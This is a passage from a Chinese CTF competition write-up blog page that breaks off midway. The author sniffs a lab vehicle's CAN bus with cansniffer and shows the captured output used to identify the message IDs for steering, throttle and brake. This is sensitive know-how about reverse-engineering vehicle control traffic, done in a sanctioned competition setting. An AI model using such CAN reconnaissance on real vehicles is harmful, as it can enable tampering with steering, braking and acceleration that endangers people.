
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>第八届工业信息安全技能大赛复赛 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%AF%E5%8F%A3%E5%B7%A5%E4%B8%9A%E6%8C%91%E6%88%98%E5%8C%BA"><span class="toc-number">2.</span> <span class="toc-text">港口工业挑战区</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BD%A6%E8%B7%AF%E4%BA%91%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E5%8C%BA"><span class="toc-number">3.</span> <span class="toc-text">车路云安全挑战区</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%95%E7%9B%98%E5%9F%9F"><span class="toc-number">3.1.</span> <span class="toc-text">底盘域</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%95%E7%9B%98%E5%9F%9F%E7%8A%B6%E6%80%81%E6%8A%A5%E6%96%87ID%E8%8E%B7%E5%8F%96"><span class="toc-number">3.1.1.</span> <span class="toc-text">底盘域状态报文ID获取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E5%9F%9F"><span class="toc-number">3.2.</span> <span class="toc-text">自动驾驶域</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E9%80%BB%E8%BE%91%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.2.1.</span> <span class="toc-text">自动驾驶逻辑破解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BD%A6%E8%BA%AB%E5%9F%9F"><span class="toc-number">3.3.</span> <span class="toc-text">车身域</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%A6%E7%AA%97%E6%8A%A5%E6%96%87%E8%8E%B7%E5%8F%96"><span class="toc-number">3.3.1.</span> <span class="toc-text">车窗报文获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%A6%E7%AA%97%E6%8E%A7%E5%88%B6"><span class="toc-number">3.3.2.</span> <span class="toc-text">车窗控制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OBD2"><span class="toc-number">3.4.</span> <span class="toc-text">OBD2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%A6%E8%BE%86VIN%E8%AF%BB%E5%8F%96"><span class="toc-number">3.4.1.</span> <span class="toc-text">车辆VIN读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%A6%E8%BE%86%E6%95%85%E9%9A%9C%E6%95%B0%E9%87%8F%E8%AF%BB%E5%8F%96"><span class="toc-number">3.4.2.</span> <span class="toc-text">车辆故障数量读取</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E5%88%9B%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E5%8C%BA"><span class="toc-number">4.</span> <span class="toc-text">信创安全挑战区</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E5%85%A5%E4%BE%B5%E6%B5%81%E9%87%8F%E7%9B%91%E6%B5%8B"><span class="toc-number">4.1.</span> <span class="toc-text">misc-入侵流量监测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E5%9B%BD%E4%BA%A7%E5%8A%9E%E5%85%AC%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">web-国产办公软件漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E5%9B%BD%E4%BA%A7%E4%B8%9A%E5%8A%A1%E7%B3%BB%E7%BB%9F%E9%9A%90%E6%82%A3%E6%8E%92%E6%9F%A5"><span class="toc-number">4.3.</span> <span class="toc-text">web-国产业务系统隐患排查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-snake"><span class="toc-number">4.4.</span> <span class="toc-text">pwn-snake</span></a></li></ol></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>第八届工业信息安全技能大赛复赛</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/1/9
        </span>
        
        <span class="category">
            <a href="/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                线下赛
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="color: #ffa2c4">代码审计</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">3.8k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">20分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不知道啊，听说在海南打就去了（</p>
<span id="more"></span>

<hr>
<h1 id="港口工业挑战区"><a href="#港口工业挑战区" class="headerlink" title="港口工业挑战区"></a>港口工业挑战区</h1><p>看不懂，连环境在哪都没找到</p>
<p>据说是扫b段，但是我扫出来的几个都没法访问，不会要拿工控软件连吧</p>
<hr>
<h1 id="车路云安全挑战区"><a href="#车路云安全挑战区" class="headerlink" title="车路云安全挑战区"></a>车路云安全挑战区</h1><p>车联网意外的很能打，最后在一堆企业里杀到单项第五</p>
<p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110120340616.png" alt="image-20250110120340616"></p>
<h2 id="底盘域"><a href="#底盘域" class="headerlink" title="底盘域"></a>底盘域</h2><h3 id="底盘域状态报文ID获取"><a href="#底盘域状态报文ID获取" class="headerlink" title="底盘域状态报文ID获取"></a>底盘域状态报文ID获取</h3><p>使用 cansniffer 抓包，注意控制车辆的web端的 ws 流要保持连接</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cansniffer <span class="token parameter variable">-c</span> can0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>先测方向盘，缓缓调整方向盘角度</p>
<p>同时观察抓包情况</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">25</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24
<span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  31F  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">5.384565</span>  <span class="token number">401</span>  00 01 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>

<span class="token number">30</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24
<span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">1.038971</span>  <span class="token number">401</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>

<span class="token number">38</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24
<span class="token number">0.413291</span>  <span class="token number">401</span>  FF F7 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>

<span class="token number">43</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24
<span class="token number">9.999999</span>  2F7  9A <span class="token number">99</span> <span class="token number">59</span> 3F 00 00 00 00 <span class="token punctuation">..</span>Y?<span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  <span class="token number">401</span>  FF F7 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>

<span class="token number">62</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">0.000000</span>  2F7  9A <span class="token number">99</span> <span class="token number">59</span> 3F 00 00 00 00 <span class="token punctuation">..</span>Y?<span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.590077</span>  <span class="token number">401</span>  FF F0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>

<span class="token number">77</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">0.000000</span>  <span class="token number">401</span>  FF F0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>

<span class="token number">81</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">9.999999</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  <span class="token number">401</span>  FF F0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>

<span class="token number">82</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>

<span class="token number">99</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.328627</span>  <span class="token number">401</span>  FF E3 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么可以猜测和方向盘有关的报文ID为401</p>
<p>同理测油门：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">33</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">0.000000</span>  <span class="token number">105</span>  00 <span class="token number">40</span> 00 00 00 00 00 00 .@<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.072732</span>  <span class="token number">204</span>  <span class="token number">22</span> 00 00 00 00 00 00 00 <span class="token string">".......
0.000000  2F6  0A 00 00 00 00 00 00 00 ........
0.000000  30F  03 E6 00 00 00 00 00 00 ........
0.000000  314  00 40 00 00 00 00 00 00 .@......
7.018217  315  00 10 00 00 00 00 00 00 ........
7.020064  32F  00 01 00 00 00 00 00 00 ........
0.050987  402  22 00 00 00 00 00 00 00 "</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.

<span class="token number">49</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">0.008977</span>  <span class="token number">105</span>  01 <span class="token number">28</span> 00 00 00 00 00 00 .<span class="token punctuation">(</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.187966</span>  <span class="token number">204</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">2.005456</span>  30F  03 E4 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">1.003900</span>  <span class="token number">314</span>  01 <span class="token number">28</span> 00 00 00 00 00 00 .<span class="token punctuation">(</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.999780</span>  <span class="token number">315</span>  00 2B 00 00 00 00 00 00 .+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">1.004486</span>  31F  00 05 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.998573</span>  32F  00 08 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.059475</span>  <span class="token number">402</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>报文ID为402</p>
<p>刹车：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">29</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">1.003801</span>  <span class="token number">105</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.245428</span>  <span class="token number">205</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token number">0.000000</span>  2F1  <span class="token number">45</span> 4E 3A <span class="token number">46</span> <span class="token number">37</span> <span class="token number">48</span> <span class="token number">32</span> <span class="token number">34</span> EN:F7H24
<span class="token number">1.007777</span>  30F  03 B0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">1.003799</span>  <span class="token number">314</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">7.006076</span>  <span class="token number">315</span>  01 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">1.007778</span>  31F  00 6D 00 00 00 00 00 00 .m<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">1.003865</span>  32F  00 A4 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.067160</span>  <span class="token number">403</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.

<span class="token number">31</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">0.000000</span>  <span class="token number">105</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  <span class="token number">205</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token number">0.000000</span>  30F  03 B0 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  <span class="token number">314</span>  03 <span class="token number">46</span> 00 00 00 00 00 00 .F<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  <span class="token number">315</span>  01 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  31F  00 6D 00 00 00 00 00 00 .m<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  32F  00 A4 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  <span class="token number">403</span>  <span class="token number">64</span> 00 00 00 00 00 00 00 d<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>报文ID为403</p>
<p>档位：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">21</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">0.000000</span>  <span class="token number">105</span>  00 B3 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  2F3  B8 0B 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">1.000811</span>  30F  03 <span class="token number">72</span> 00 00 00 00 00 00 .r<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  <span class="token number">314</span>  00 B3 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  <span class="token number">315</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">1.001970</span>  31F  00 E9 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">1.001312</span>  32F  01 5E 00 00 00 00 00 00 .^<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  <span class="token number">404</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>

<span class="token number">24</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">0.000000</span>  2F3  B8 0B 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">9.999999</span>  2F7  9A <span class="token number">99</span> <span class="token number">59</span> 3F 00 00 00 00 <span class="token punctuation">..</span>Y?<span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  30F  03 <span class="token number">72</span> 00 00 00 00 00 00 .r<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  <span class="token number">315</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  31F  00 E9 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  32F  01 5E 00 00 00 00 00 00 .^<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
